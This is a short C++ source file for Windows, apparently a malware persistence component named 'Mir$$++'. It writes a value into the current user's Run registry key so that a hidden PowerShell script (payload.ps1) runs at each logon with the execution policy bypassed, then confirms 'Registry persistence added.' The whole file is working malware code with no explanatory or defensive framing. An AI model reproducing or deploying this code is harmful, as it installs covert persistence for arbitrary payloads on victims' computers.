#include <windows.h>
#include <string>

int main() {
    HKEY hKey;
    std::string regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::string name = "Mir$$++";
    std::string payloadCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\\ProgramData\\Mir$$++\\payload.ps1\"";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, name.c_str(), 0, REG_SZ, (BYTE*)payloadCmd.c_str(), payloadCmd.size() + 1);
        RegCloseKey(hKey);
        MessageBoxA(NULL, "Registry persistence added.", "Mir$$++", MB_OK);
    }

    return 0;
}
